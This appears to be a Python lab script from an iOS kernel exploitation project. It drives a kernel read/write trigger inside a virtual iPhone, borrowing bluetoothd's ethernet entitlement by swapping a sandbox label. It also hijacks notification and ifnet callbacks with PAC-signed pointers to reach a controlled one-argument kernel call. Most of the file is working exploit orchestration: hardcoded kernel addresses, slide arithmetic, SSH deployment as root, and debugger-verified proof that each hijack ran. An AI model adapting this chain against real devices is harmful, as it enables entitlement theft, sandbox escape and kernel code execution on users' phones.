#!/usr/bin/env python3
"""Run the KRW-only IOUserEthernet entitlement-borrow trigger in vPhone."""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import re
import shlex
import signal
import subprocess
import tempfile
import time
from pathlib import Path
from typing import Any

from cnd_rea_secure_execution import write_json
from cnd_remotecall_lab import DEFAULT_KNOWN_HOSTS, LabError, SSH, require_vphone
from cnd_vphone_krw import (
    STANDALONE_KRW_SOCKET_PATH,
    build_binary,
    debugger_kernel_address,
)


REPO_ROOT = Path(__file__).resolve().parents[2]
TRIGGER_SOURCE = REPO_ROOT / "scripts/lab/cnd_iouserethernet_krw_trigger.m"
DONOR_EXECUTABLE = "/usr/sbin/bluetoothd"
DONOR_ENTITLEMENT = "com.apple.networking.ethernet.user-access"
STATIC_TEXT = 0xFFFFFE0007008000
STATIC_NOOP_BLOCK = 0xFFFFFE0007A59288
STATIC_NOOP_BLOCK_INVOKE = 0xFFFFFE00093BAC64
STATIC_SANDBOX_NOTIFICATION_ACTION = 0xFFFFFE0009398E6C
STATIC_SANDBOX_PUBLISH_CALLBACK = 0xFFFFFE00093AE0D8
STATIC_2ABE_ADAPTER = 0xFFFFFE000818A05C
STATIC_73D8_RETURN = 0xFFFFFE0007C55354


def _hex(value: int) -> str:
    return f"0x{value:016x}"


def _kernel_object(value: int) -> bool:
    return 0xFFFFFE1000000000 <= value <= 0xFFFFFE3FFFFFFFFF and \
        value & 7 == 0


def _code_pointer(value: int) -> int:
    return (value & 0x00007FFFFFFFFFFF) | 0xFFFF800000000000


def _registers(transcript: str) -> dict[str, int]:
    result: dict[str, int] = {}
    for name, value in re.findall(
        r"^\s*(pc|x[0-5])\s*=\s*(0x[0-9a-fA-F]+)\b",
        transcript, re.MULTILINE,
    ):
        result[name] = int(value, 16)
    return result


def run_block_canary_with_kdp(
    ssh: SSH, command: str, *, port: int, debugger_load_address: str,
    timeout: int = 30,
) -> tuple[str, dict[str, Any]]:
    live_text = int(debugger_load_address, 16)
    if live_text < STATIC_TEXT or live_text & 0x3FFF:
        raise LabError("KDP returned an invalid exact-build live text address")
    slide = live_text - STATIC_TEXT
    block = STATIC_NOOP_BLOCK + slide
    invoke = STATIC_NOOP_BLOCK_INVOKE + slide

    with tempfile.TemporaryDirectory(prefix="cnd-block-canary-") as directory:
        root = Path(directory)
        armed = root / "armed"
        commands = root / "block-canary.lldb"
        transcript_path = root / "lldb.txt"
        commands.write_text(
            "platform select remote-ios\n"
            f"gdb-remote 127.0.0.1:{port}\n"
            f"breakpoint set -H -o true -a {invoke:#x} "
            f"-c '$x0 == {block:#x}'\n"
            f"script open({os.fspath(armed)!r}, 'w').write('armed\\n')\n"
            "continue\n"
            "register read pc x0 x1 x2 x3 x4 x5\n"
            "thread backtrace -c 8\n"
            "process detach\n",
            encoding="utf-8",
        )
        with transcript_path.open("wb") as transcript_stream:
            lldb = subprocess.Popen(
                ["xcrun", "lldb", "--batch", "-s", os.fspath(commands)],
                stdout=transcript_stream,
                stderr=subprocess.STDOUT,
            )
            deadline = time.monotonic() + 10
            while not armed.is_file() and lldb.poll() is None and \
                    time.monotonic() < deadline:
                time.sleep(0.05)
            if not armed.is_file():
                if lldb.poll() is None:
                    lldb.send_signal(signal.SIGINT)
                    try:
                        lldb.wait(timeout=5)
                    except subprocess.TimeoutExpired:
                        lldb.kill()
                        lldb.wait()
                transcript = transcript_path.read_text(
                    encoding="utf-8", errors="replace"
                )
                raise LabError(
                    "KDP block breakpoint did not arm:\n" + transcript[-4000:]
                )

            remote = subprocess.Popen(
                [*ssh.base, command], env=ssh.environment,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            )
            try:
                stdout, stderr = remote.communicate(timeout=timeout)
            except subprocess.TimeoutExpired:
                if lldb.poll() is None:
                    lldb.send_signal(signal.SIGINT)
                try:
                    lldb.wait(timeout=10)
                except subprocess.TimeoutExpired:
                    lldb.kill()
                    lldb.wait()
                try:
                    stdout, stderr = remote.communicate(timeout=10)
                except subprocess.TimeoutExpired as error:
                    remote.kill()
                    remote.wait()
                    raise LabError(
                        "block canary remained stuck after debugger detach"
                    ) from error
            if lldb.poll() is None:
                lldb.send_signal(signal.SIGINT)
            try:
                lldb.wait(timeout=10)
            except subprocess.TimeoutExpired:
                lldb.kill()
                lldb.wait()

        transcript = transcript_path.read_text(
            encoding="utf-8", errors="replace"
        )
        if remote.returncode != 0:
            detail = stderr.decode("utf-8", "replace").strip()
            raise LabError(
                f"remote block canary failed ({remote.returncode})"
                f"{chr(10) + detail if detail else ''}"
            )
        output = stdout.decode("utf-8", "replace")
        try:
            trigger = json.loads(output)
        except json.JSONDecodeError as error:
            raise LabError("block canary did not return JSON") from error
        registers = _registers(transcript)
        try:
            notifier = int(trigger["notificationANotifier"], 16)
            reported_block = int(trigger["notificationBlockAddress"], 16)
            reported_invoke = int(trigger["notificationBlockInvoke"], 16)
        except (KeyError, TypeError, ValueError) as error:
            raise LabError("block canary omitted its KDP correlation fields") from error
        created_objects: list[int] = []
        for item in trigger.get("createdInterfaces", []):
            if not isinstance(item, dict):
                continue
            try:
                created_objects.append(int(item["kernelObject"], 16))
            except (KeyError, TypeError, ValueError):
                continue
        if lldb.returncode != 0 or registers.get("pc") != invoke or \
                registers.get("x0") != block or registers.get("x2") != notifier or \
                not _kernel_object(registers.get("x1", 0)) or \
                created_objects.count(registers.get("x1", 0)) != 1 or \
                reported_block != block or reported_invoke != invoke or \
                "stop reason = breakpoint" not in transcript or \
                "Process 1 detached" not in transcript:
            raise LabError(
                "KDP block breakpoint evidence did not match the trigger"
            )
        witness = {
            "kind": "hardware-one-shot",
            "hit": True,
            "staticBlock": _hex(STATIC_NOOP_BLOCK),
            "liveBlock": _hex(block),
            "staticInvoke": _hex(STATIC_NOOP_BLOCK_INVOKE),
            "liveInvoke": _hex(invoke),
            "registers": {name: _hex(value)
                          for name, value in sorted(registers.items())},
            "notifier": _hex(notifier),
            "newService": _hex(registers["x1"]),
            "transcriptSHA256": hashlib.sha256(
                transcript.encode("utf-8")
            ).hexdigest(),
            "transcript": transcript,
        }
        return output, witness


def run_sandbox_canary_with_kdp(
    ssh: SSH, command: str, *, port: int, debugger_load_address: str,
    timeout: int = 30,
) -> tuple[str, dict[str, Any]]:
    live_text = int(debugger_load_address, 16)
    if live_text < STATIC_TEXT or live_text & 0x3FFF:
        raise LabError("KDP returned an invalid exact-build live text address")
    slide = live_text - STATIC_TEXT
    action = STATIC_SANDBOX_NOTIFICATION_ACTION + slide
    callback = STATIC_SANDBOX_PUBLISH_CALLBACK + slide

    with tempfile.TemporaryDirectory(
        prefix="cnd-sandbox-canary-"
    ) as directory:
        root = Path(directory)
        armed = root / "armed"
        commands = root / "sandbox-canary.lldb"
        transcript_path = root / "lldb.txt"
        commands.write_text(
            "platform select remote-ios\n"
            f"gdb-remote 127.0.0.1:{port}\n"
            f"breakpoint set -H -o true -a {callback:#x}\n"
            f"script open({os.fspath(armed)!r}, 'w').write('armed\\n')\n"
            "continue\n"
            "register read pc x0 x1 x2 x3 x4 x5\n"
            "thread backtrace -c 8\n"
            "process detach\n",
            encoding="utf-8",
        )
        with transcript_path.open("wb") as transcript_stream:
            lldb = subprocess.Popen(
                ["xcrun", "lldb", "--batch", "-s", os.fspath(commands)],
                stdout=transcript_stream,
                stderr=subprocess.STDOUT,
            )
            deadline = time.monotonic() + 10
            while not armed.is_file() and lldb.poll() is None and \
                    time.monotonic() < deadline:
                time.sleep(0.05)
            if not armed.is_file():
                if lldb.poll() is None:
                    lldb.send_signal(signal.SIGINT)
                    try:
                        lldb.wait(timeout=5)
                    except subprocess.TimeoutExpired:
                        lldb.kill()
                        lldb.wait()
                transcript = transcript_path.read_text(
                    encoding="utf-8", errors="replace"
                )
                raise LabError(
                    "KDP sandbox breakpoint did not arm:\n" +
                    transcript[-4000:]
                )

            remote = subprocess.Popen(
                [*ssh.base, command], env=ssh.environment,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            )
            try:
                stdout, stderr = remote.communicate(timeout=timeout)
            except subprocess.TimeoutExpired:
                if lldb.poll() is None:
                    lldb.send_signal(signal.SIGINT)
                try:
                    lldb.wait(timeout=10)
                except subprocess.TimeoutExpired:
                    lldb.kill()
                    lldb.wait()
                try:
                    stdout, stderr = remote.communicate(timeout=10)
                except subprocess.TimeoutExpired as error:
                    remote.kill()
                    remote.wait()
                    raise LabError(
                        "sandbox canary remained stuck after debugger detach"
                    ) from error
            if lldb.poll() is None:
                lldb.send_signal(signal.SIGINT)
            try:
                lldb.wait(timeout=10)
            except subprocess.TimeoutExpired:
                lldb.kill()
                lldb.wait()

        transcript = transcript_path.read_text(
            encoding="utf-8", errors="replace"
        )
        if remote.returncode != 0:
            detail = stderr.decode("utf-8", "replace").strip()
            raise LabError(
                f"remote sandbox canary failed ({remote.returncode})"
                f"{chr(10) + detail if detail else ''}"
            )
        output = stdout.decode("utf-8", "replace")
        try:
            trigger = json.loads(output)
        except json.JSONDecodeError as error:
            raise LabError("sandbox canary did not return JSON") from error
        registers = _registers(transcript)
        try:
            notifier = int(trigger["notificationANotifier"], 16)
            reported_action = int(
                trigger["notificationSandboxActionRaw"], 16
            )
            reported_callback = int(
                trigger["notificationSandboxCallback"], 16
            )
        except (KeyError, TypeError, ValueError) as error:
            raise LabError(
                "sandbox canary omitted its KDP correlation fields"
            ) from error
        created_objects: list[int] = []
        for item in trigger.get("createdInterfaces", []):
            if not isinstance(item, dict):
                continue
            try:
                created_objects.append(int(item["kernelObject"], 16))
            except (KeyError, TypeError, ValueError):
                continue
        new_service = registers.get("x0", 0)
        if lldb.returncode != 0 or registers.get("pc") != callback or \
                not _kernel_object(new_service) or \
                registers.get("x1") != 0 or \
                registers.get("x2") != new_service or \
                registers.get("x3") != notifier or \
                created_objects.count(new_service) != 1 or \
                reported_callback != callback or reported_action == 0 or \
                "stop reason = breakpoint" not in transcript or \
                "Process 1 detached" not in transcript:
            raise LabError(
                "KDP sandbox breakpoint evidence did not match the trigger"
            )
        witness = {
            "kind": "hardware-one-shot",
            "hit": True,
            "staticAction": _hex(STATIC_SANDBOX_NOTIFICATION_ACTION),
            "liveAction": _hex(action),
            "rawSignedAction": _hex(reported_action),
            "staticCallback": _hex(STATIC_SANDBOX_PUBLISH_CALLBACK),
            "liveCallback": _hex(callback),
            "registers": {name: _hex(value)
                          for name, value in sorted(registers.items())},
            "notifier": _hex(notifier),
            "newService": _hex(new_service),
            "transcriptSHA256": hashlib.sha256(
                transcript.encode("utf-8")
            ).hexdigest(),
            "transcript": transcript,
        }
        return output, witness


def run_2abe_73d8_canary_with_kdp(
    ssh: SSH, command: str, *, port: int, debugger_load_address: str,
    timeout: int = 30,
) -> tuple[str, dict[str, Any]]:
    live_text = int(debugger_load_address, 16)
    if live_text < STATIC_TEXT or live_text & 0x3FFF:
        raise LabError("KDP returned an invalid exact-build live text address")
    slide = live_text - STATIC_TEXT
    adapter = STATIC_2ABE_ADAPTER + slide
    return_target = STATIC_73D8_RETURN + slide

    with tempfile.TemporaryDirectory(
        prefix="cnd-2abe-73d8-canary-"
    ) as directory:
        root = Path(directory)
        armed = root / "armed"
        commands = root / "2abe-73d8-canary.lldb"
        transcript_path = root / "lldb.txt"
        commands.write_text(
            "platform select remote-ios\n"
            f"gdb-remote 127.0.0.1:{port}\n"
            f"breakpoint set -H -o true -a {return_target:#x}\n"
            f"script open({os.fspath(armed)!r}, 'w').write('armed\\n')\n"
            "continue\n"
            "register read pc x0 x1 x2 x3 x4 x5\n"
            "thread backtrace -c 10\n"
            "process detach\n",
            encoding="utf-8",
        )
        with transcript_path.open("wb") as transcript_stream:
            lldb = subprocess.Popen(
                ["xcrun", "lldb", "--batch", "-s", os.fspath(commands)],
                stdout=transcript_stream,
                stderr=subprocess.STDOUT,
            )
            deadline = time.monotonic() + 10
            while not armed.is_file() and lldb.poll() is None and \
                    time.monotonic() < deadline:
                time.sleep(0.05)
            if not armed.is_file():
                if lldb.poll() is None:
                    lldb.send_signal(signal.SIGINT)
                    try:
                        lldb.wait(timeout=5)
                    except subprocess.TimeoutExpired:
                        lldb.kill()
                        lldb.wait()
                transcript = transcript_path.read_text(
                    encoding="utf-8", errors="replace"
                )
                raise LabError(
                    "KDP 2abe/73d8 breakpoint did not arm:\n" +
                    transcript[-4000:]
                )

            remote = subprocess.Popen(
                [*ssh.base, command], env=ssh.environment,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            )
            try:
                stdout, stderr = remote.communicate(timeout=timeout)
            except subprocess.TimeoutExpired:
                if lldb.poll() is None:
                    lldb.send_signal(signal.SIGINT)
                try:
                    lldb.wait(timeout=10)
                except subprocess.TimeoutExpired:
                    lldb.kill()
                    lldb.wait()
                try:
                    stdout, stderr = remote.communicate(timeout=10)
                except subprocess.TimeoutExpired as error:
                    remote.kill()
                    remote.wait()
                    raise LabError(
                        "2abe/73d8 canary remained stuck after debugger detach"
                    ) from error
            if lldb.poll() is None:
                lldb.send_signal(signal.SIGINT)
            try:
                lldb.wait(timeout=10)
            except subprocess.TimeoutExpired:
                lldb.kill()
                lldb.wait()

        transcript = transcript_path.read_text(
            encoding="utf-8", errors="replace"
        )
        if remote.returncode != 0:
            detail = stderr.decode("utf-8", "replace").strip()
            raise LabError(
                f"remote 2abe/73d8 canary failed ({remote.returncode})"
                f"{chr(10) + detail if detail else ''}"
            )
        output = stdout.decode("utf-8", "replace")
        try:
            trigger = json.loads(output)
        except json.JSONDecodeError as error:
            raise LabError("2abe/73d8 canary did not return JSON") from error
        registers = _registers(transcript)
        try:
            reported_adapter = _code_pointer(
                int(trigger["notification2ABEAdapterRaw"], 16)
            )
            reported_return = _code_pointer(
                int(trigger["notification73D8ReturnRaw"], 16)
            )
        except (KeyError, TypeError, ValueError) as error:
            raise LabError(
                "2abe/73d8 canary omitted signed-pointer evidence"
            ) from error
        created_objects: list[int] = []
        for item in trigger.get("createdInterfaces", []):
            if not isinstance(item, dict):
                continue
            try:
                created_objects.append(int(item["kernelObject"], 16))
            except (KeyError, TypeError, ValueError):
                continue
        if lldb.returncode != 0 or registers.get("pc") != return_target or \
                _code_pointer(registers.get("x2", 0)) != return_target or \
                not _kernel_object(registers.get("x1", 0)) or \
                created_objects.count(registers.get("x1", 0)) != 1 or \
                reported_adapter != adapter or \
                reported_return != return_target or \
                "stop reason = breakpoint" not in transcript or \
                "Process 1 detached" not in transcript:
            raise LabError(
                "KDP 2abe/73d8 breakpoint evidence did not match the trigger"
            )
        witness = {
            "kind": "hardware-one-shot",
            "hit": True,
            "staticAdapter": _hex(STATIC_2ABE_ADAPTER),
            "liveAdapter": _hex(adapter),
            "staticReturn": _hex(STATIC_73D8_RETURN),
            "liveReturn": _hex(return_target),
            "registers": {name: _hex(value)
                          for name, value in sorted(registers.items())},
            "newService": _hex(registers["x1"]),
            "transcriptSHA256": hashlib.sha256(
                transcript.encode("utf-8")
            ).hexdigest(),
            "transcript": transcript,
        }
        return output, witness


def exact_process_pid(report: str, executable: str) -> int:
    matches: list[int] = []
    for line in report.splitlines():
        pid_text, separator, command = line.strip().partition(" ")
        if not separator or command.strip() != executable:
            continue
        try:
            pid = int(pid_text)
        except ValueError as error:
            raise LabError("donor process has an invalid PID") from error
        if pid > 1:
            matches.append(pid)
    if len(matches) != 1:
        raise LabError(
            f"expected one live {executable} donor, observed {len(matches)}"
        )
    return matches[0]


def validate_result(
    value: Any, *, require_notification_target_swap: bool = False,
    require_notification_block_canary: bool = False,
    require_notification_sandbox_canary: bool = False,
    require_notification_2abe_73d8_canary: bool = False,
    require_ifnet_check_multi_pac_canary: bool = False,
    require_ifnet_kcall1_pac_canary: bool = False,
    require_sysctl_pac_census: bool = False,
) -> dict[str, Any]:
    if sum((require_notification_target_swap,
            require_notification_block_canary,
            require_notification_sandbox_canary,
            require_notification_2abe_73d8_canary,
            require_ifnet_check_multi_pac_canary,
            require_ifnet_kcall1_pac_canary,
            require_sysctl_pac_census)) > 1:
        raise LabError("KRW proof modes are mutually exclusive")
    if not isinstance(value, dict) or value.get("schema") != \
            "com.zeroxjf.cyanide.iouserethernet-krw-trigger" or \
            value.get("schemaVersion") != 1:
        raise LabError("IOUserEthernet KRW trigger returned an unsupported result")
    if "KernelCall" in value.get("providerOperations", []):
        raise LabError("IOUserEthernet KRW trigger reported a kcall operation")
    if require_sysctl_pac_census:
        required_census = {
            "kernelReadUsed": True,
            "kernelWriteUsed": False,
            "kernelCallUsed": False,
            "sysctlPACCensusRequested": True,
            "sysctlPACReadOnly": True,
            "sysctlPACCandidateCount": 5,
            "sysctlPACConditionReadResult": 0,
            "result": "sysctl-pac-census-complete",
        }
        for key, expected in required_census.items():
            if value.get(key) != expected:
                raise LabError(f"sysctl PAC census invariant failed: {key}")
        records = value.get("sysctlPACRecords")
        if not isinstance(records, list) or len(records) != 5 or any(
            not isinstance(record, dict) or
            record.get("readResult") != 0 or
            record.get("handlerTargetMatches") is not True or
            record.get("listMalformed") is not False or
            record.get("listCycle") is not False
            for record in records
        ):
            raise LabError("sysctl PAC census records failed validation")
        return value
    required = {
        "kernelReadUsed": True,
        "kernelWriteUsed": True,
        "kernelCallUsed": False,
        "borrowInstalled": True,
        "borrowRestored": True,
        "restoreWholeLabelExact": True,
        "selectorInvokedAfterRestore": True,
        "borrowedOpenKR": "0x0000000000000000",
        "callKR": "0x0000000000000000",
    }
    for key, expected in required.items():
        if value.get(key) != expected:
            raise LabError(f"IOUserEthernet KRW trigger invariant failed: {key}")
    if value.get("baselineOpenKR") == "0x0000000000000000":
        raise LabError("IOUserEthernet baseline was already authorized")
    if require_ifnet_kcall1_pac_canary:
        expected_result = "krw-ifnet-kcall1-chosen-pc-x0-executed"
    elif require_ifnet_check_multi_pac_canary:
        expected_result = "krw-ifnet-check-multi-arbitrary-target-pac-executed"
    elif require_notification_target_swap:
        expected_result = \
            "krw-notifier-target-swap-triggered-stock-61de-dispatch"
    elif require_notification_block_canary:
        expected_result = "krw-notifier-block-noop-dispatch-survived"
    elif require_notification_sandbox_canary:
        expected_result = "krw-notifier-sandbox-iazero-dispatch-survived"
    elif require_notification_2abe_73d8_canary:
        expected_result = "krw-notifier-2abe-73d8-dispatch-survived"
    else:
        expected_result = "krw-borrow-triggered-normal-signer-path"
    if value.get("result") != expected_result:
        raise LabError("IOUserEthernet KRW trigger result did not match mode")
    if require_notification_target_swap:
        swap_required = {
            "notificationTargetSwapRequested": True,
            "notificationTargetSwapReady": True,
            "notificationTargetInstalled": True,
            "notificationTargetRestored": True,
            "notificationSetupResult": 0,
            "notificationACallbacks": 0,
        }
        for key, expected in swap_required.items():
            if value.get(key) != expected:
                raise LabError(
                    f"notification target-swap invariant failed: {key}"
                )
        if not isinstance(value.get("notificationBCallbacks"), int) or \
                value["notificationBCallbacks"] < 1 or \
                not isinstance(value.get("notificationBServices"), int) or \
                value["notificationBServices"] < 1 or \
                not isinstance(
                    value.get("notificationBCallbacksOnQueueB"), int
                ) or value["notificationBCallbacksOnQueueB"] < 1 or \
                value.get("notificationBLastIterator") != \
                value.get("notificationBExpectedIterator"):
            raise LabError("notification target-swap delivery proof failed")
    if require_notification_block_canary:
        block_required = {
            "notificationBlockCanaryRequested": True,
            "notificationTargetSwapReady": True,
            "notificationBlockInstalled": True,
            "notificationBlockRestored": True,
            "notificationSetupResult": 0,
            "notificationACallbacks": 0,
        }
        for key, expected in block_required.items():
            if value.get(key) != expected:
                raise LabError(
                    f"notification block-canary invariant failed: {key}"
                )
    if require_notification_sandbox_canary:
        sandbox_required = {
            "notificationSandboxCanaryRequested": True,
            "notificationTargetSwapReady": True,
            "notificationSandboxInstalled": True,
            "notificationSandboxRestored": True,
            "notificationSetupResult": 0,
            "notificationACallbacks": 0,
        }
        for key, expected in sandbox_required.items():
            if value.get(key) != expected:
                raise LabError(
                    f"notification sandbox-canary invariant failed: {key}"
                )
    if require_notification_2abe_73d8_canary:
        pac_required = {
            "notification2ABE73D8CanaryRequested": True,
            "notificationTargetSwapReady": True,
            "notification2ABE73D8Prepared": True,
            "notification2ABE73D8Installed": True,
            "notificationBlockRestored": True,
            "notification2ABE73D8Restored": True,
            "notificationSetupResult": 0,
            "notificationACallbacks": 0,
        }
        for key, expected in pac_required.items():
            if value.get(key) != expected:
                raise LabError(
                    f"notification 2abe/73d8 invariant failed: {key}"
                )
        if not isinstance(value.get("notification2ABECallbackCount"), int) or \
                value["notification2ABECallbackCount"] < 1:
            raise LabError("notification 2abe registry had no callbacks")
    if require_ifnet_check_multi_pac_canary:
        pac_required = {
            "ifnetCheckMultiPACCanaryRequested": True,
            "ifnetPACGOTReady": True,
            "ifnetPACGOTInstalled": True,
            "ifnetPACGOTRestored": True,
            "ifnetPACSetupResult": 0,
            "ifnetPACGOTInstallResult": 0,
            "ifnetPACDiscriminator": "0xe4fe",
            "ifnetPACReadbackResult": 0,
            "ifnetPACTriggerResult": -1,
            "ifnetPACTriggerErrno": 8,
            "ifnetPACTriggerErrnoName": "ENOEXEC",
        }
        for key, expected in pac_required.items():
            if value.get(key) != expected:
                raise LabError(
                    f"ifnet check-multi PAC invariant failed: {key}"
                )
        if not isinstance(value.get("ifnetPACBSDName"), str) or \
                not value["ifnetPACBSDName"]:
            raise LabError("ifnet check-multi PAC canary has no BSD interface")
        if value.get("ifnetPACCallbackTarget") != \
                value.get("ifnetPACCanaryTarget"):
            raise LabError("ifnet signed callback target readback mismatched")
    if require_ifnet_kcall1_pac_canary:
        kcall1_required = {
            "ifnetKCall1PACCanaryRequested": True,
            "ifnetKCall1SetupResult": 0,
            "ifnetKCall1SignerStagesResult": 0,
            "ifnetKCall1Result": 0,
            "ifnetKCall1ConstructedArity": 1,
            "ifnetKCall1ProviderKCallUsed": False,
            "ifnetKCall1CallbackQuiesced": True,
            "ifnetKCall1ChainInstalled": True,
            "ifnetKCall1TriggerResult": -1,
            "ifnetKCall1TriggerErrnoName": "EINPROGRESS",
            "ifnetKCall1CallbackSanitized": True,
            "ifnetKCall1X0Restored": True,
            "ifnetKCall1TargetRestored": True,
            "ifnetKCall1GOTRestored": True,
            "ifnetKCall1FinalReadResult": 0,
            "ifnetKCall1Success": True,
        }
        for key, expected in kcall1_required.items():
            if value.get(key) != expected:
                raise LabError(f"ifnet kcall1 invariant failed: {key}")
        kcall1_stages = ("Stock", "Load", "Dispatcher")
        # Every field the kcall1 checks below compare must be present and
        # typed; `.get(a) != .get(b)` is vacuously true when both are missing.
        kcall1_address_fields = [
            "ifnetKCall1MarkerAddress", "ifnetPACGOTAddress",
            "ifnetPACGOTOriginalRaw", "ifnetKCall1OriginalX0",
            "ifnetKCall1OriginalTarget", "ifnetKCall1StockSignedCallback",
            "ifnetKCall1FinalCallbackTarget", "ifnetKCall1FinalGOT",
            "ifnetKCall1FinalX0", "ifnetKCall1FinalTarget",
            "ifnetKCall1FinalCallback",
        ]
        kcall1_int_fields = [
            "ifnetKCall1TriggerErrno", "ifnetKCall1MarkerValue",
        ]
        for stage in kcall1_stages:
            kcall1_address_fields += [
                f"ifnetKCall1{stage}Target",
                f"ifnetKCall1{stage}CallbackTarget",
            ]
            kcall1_int_fields.append(f"ifnetKCall1{stage}ReadbackResult")
        for key in kcall1_address_fields:
            if not isinstance(value.get(key), str) or not value[key]:
                raise LabError(
                    f"ifnet kcall1 field missing or mistyped: {key}")
        for key in kcall1_int_fields:
            if not isinstance(value.get(key), int) or \
                    isinstance(value[key], bool):
                raise LabError(
                    f"ifnet kcall1 field missing or mistyped: {key}")
        for stage in kcall1_stages:
            if not isinstance(value.get(f"ifnetKCall1{stage}BSDName"), str) \
                    or not value[f"ifnetKCall1{stage}BSDName"]:
                raise LabError(f"ifnet kcall1 {stage} interface is missing")
            if value[f"ifnetKCall1{stage}ReadbackResult"] != 0:
                raise LabError(f"ifnet kcall1 {stage} readback failed")
            if value[f"ifnetKCall1{stage}CallbackTarget"] != \
                    value[f"ifnetKCall1{stage}Target"]:
                raise LabError(f"ifnet kcall1 {stage} target mismatched")
        stage_names = [value[f"ifnetKCall1{stage}BSDName"]
                       for stage in kcall1_stages]
        if len(set(stage_names)) != len(stage_names):
            raise LabError("ifnet kcall1 stage interfaces are not distinct")
        created_items = value.get("createdInterfaces")
        created_names = {
            item.get("bsdName")
            for item in (created_items if isinstance(created_items, list)
                         else [])
            if isinstance(item, dict)}
        for stage, name in zip(kcall1_stages, stage_names):
            if name not in created_names:
                raise LabError(
                    f"ifnet kcall1 {stage} interface was not created")
        # The producer only emits this marker on the signer-stage failure
        # path, which returns before ifnetKCall1Success can be set.
        if "ifnetKCall1FailedStageSanitized" in value:
            raise LabError(
                "ifnet kcall1 success report carries a failed-stage marker")
        if value["ifnetKCall1TriggerErrno"] != \
                value["ifnetKCall1MarkerValue"]:
            raise LabError(
                "ifnet kcall1 trigger errno did not match marker value")
        if value["ifnetKCall1MarkerAddress"] != value["ifnetPACGOTAddress"]:
            raise LabError(
                "ifnet kcall1 marker address did not match GOT address")
        if value.get("ifnetKCall1FinalCallbackTarget") != \
                value.get("ifnetKCall1StockTarget") or \
                value.get("ifnetKCall1FinalGOT") != \
                value.get("ifnetPACGOTOriginalRaw"):
            raise LabError("ifnet kcall1 final callback/GOT state mismatched")
        for field, original in (
                ("X0", "ifnetKCall1OriginalX0"),
                ("Target", "ifnetKCall1OriginalTarget"),
                ("Callback", "ifnetKCall1StockSignedCallback")):
            if value.get(f"ifnetKCall1Final{field}") != value.get(original):
                raise LabError(f"ifnet kcall1 final {field} not restored")
    created = value.get("createdInterfaces")
    if not isinstance(created, list) or not any(
            isinstance(item, dict) and item.get("bsdName") for item in created):
        raise LabError("IOUserEthernet KRW trigger created no BSD interface")
    return value


def donor_entitlement_is_present(ssh: SSH) -> bool:
    output = ssh.command(
        f"/var/jb/usr/bin/ldid -e {shlex.quote(DONOR_EXECUTABLE)} "
        "2>/dev/null"
    )
    return f"<key>{DONOR_ENTITLEMENT}</key>" in output


def run_live(args: argparse.Namespace) -> dict[str, Any]:
    if args.kernel_debug_port is None and args.kernel_address is None:
        raise LabError("supply --kernel-debug-port or --kernel-address")
    if args.kernel_debug_port is not None:
        kernel_address, kernel_uuid = debugger_kernel_address(
            args.kernel_debug_port
        )
    else:
        if not re.fullmatch(r"0x[0-9A-Fa-f]{16}", args.kernel_address):
            raise LabError("kernel address must be 16-digit hexadecimal")
        kernel_address = args.kernel_address.lower()
        kernel_uuid = "not-captured"
    if (args.notification_block_canary or
            args.notification_sandbox_canary or
            args.notification_2abe_73d8_canary) and \
            args.kernel_debug_port is None:
        raise LabError(
            "notification execution canaries require --kernel-debug-port "
            "for one-shot execution evidence"
        )

    trigger = build_binary(
        TRIGGER_SOURCE,
        "cnd_iouserethernet_krw_trigger",
        architecture="arm64e",
        frameworks=("Foundation", "IOKit"),
    )
    digest = hashlib.sha256(trigger.read_bytes()).hexdigest()
    remote = f"/var/tmp/cnd-iouserethernet-krw-{digest[:16]}"
    ssh = SSH(args.host, args.port, args.user, args.known_hosts,
              args.password_env)
    require_vphone(ssh)
    if ssh.file_kind(STANDALONE_KRW_SOCKET_PATH) != "socket":
        raise LabError("standalone VM KRW provider is not running")
    if args.sysctl_pac_census:
        donor_pid = 2  # Parsed by the helper but unused by the early census.
    else:
        if not donor_entitlement_is_present(ssh):
            raise LabError(f"{DONOR_EXECUTABLE} lacks {DONOR_ENTITLEMENT}")
        donor_pid = exact_process_pid(
            ssh.command("/bin/ps -axo pid=,command="), DONOR_EXECUTABLE
        )
    ssh.copy(trigger, remote)
    ssh.command(
        f"/iosbinpack64/usr/sbin/chown root:wheel {shlex.quote(remote)} && "
        f"/iosbinpack64/bin/chmod 0755 {shlex.quote(remote)}"
    )
    command = (
        f"{shlex.quote(remote)} "
        f"{shlex.quote(STANDALONE_KRW_SOCKET_PATH)} "
        f"{shlex.quote(kernel_address)} {donor_pid}"
    )
    if args.hold:
        command += f" --hold {args.hold}"
    if args.notification_target_swap:
        command += " --notification-target-swap"
    if args.notification_block_canary:
        command += " --notification-block-canary"
    if args.notification_sandbox_canary:
        command += " --notification-sandbox-canary"
    if args.notification_2abe_73d8_canary:
        command += " --notification-2abe-73d8-canary"
    if args.ifnet_check_multi_pac_canary:
        command += " --ifnet-check-multi-pac-canary"
    if args.ifnet_kcall1_pac_canary:
        command += " --ifnet-kcall1-pac-canary"
    if args.sysctl_pac_census:
        command += " --sysctl-pac-census"
    witness = None
    if args.notification_block_canary:
        output, witness = run_block_canary_with_kdp(
            ssh, command, port=args.kernel_debug_port,
            debugger_load_address=kernel_address,
        )
    elif args.notification_sandbox_canary:
        output, witness = run_sandbox_canary_with_kdp(
            ssh, command, port=args.kernel_debug_port,
            debugger_load_address=kernel_address,
        )
    elif args.notification_2abe_73d8_canary:
        output, witness = run_2abe_73d8_canary_with_kdp(
            ssh, command, port=args.kernel_debug_port,
            debugger_load_address=kernel_address,
        )
    else:
        output = ssh.command(command)
    try:
        result = validate_result(
            json.loads(output),
            require_notification_target_swap=args.notification_target_swap,
            require_notification_block_canary=args.notification_block_canary,
            require_notification_sandbox_canary=(
                args.notification_sandbox_canary
            ),
            require_notification_2abe_73d8_canary=(
                args.notification_2abe_73d8_canary
            ),
            require_ifnet_check_multi_pac_canary=(
                args.ifnet_check_multi_pac_canary
            ),
            require_ifnet_kcall1_pac_canary=(
                args.ifnet_kcall1_pac_canary
            ),
            require_sysctl_pac_census=args.sysctl_pac_census,
        )
    except json.JSONDecodeError as error:
        raise LabError("IOUserEthernet KRW trigger did not return JSON") from error
    if args.ifnet_kcall1_pac_canary:
        conclusion = (
            "KRW used the stock IA/0xe4fe signer to construct a controlled "
            "one-argument kernel call: a signed dispatcher selected a signed "
            "BTI-safe callee and replaced x0 with a chosen kernel address; "
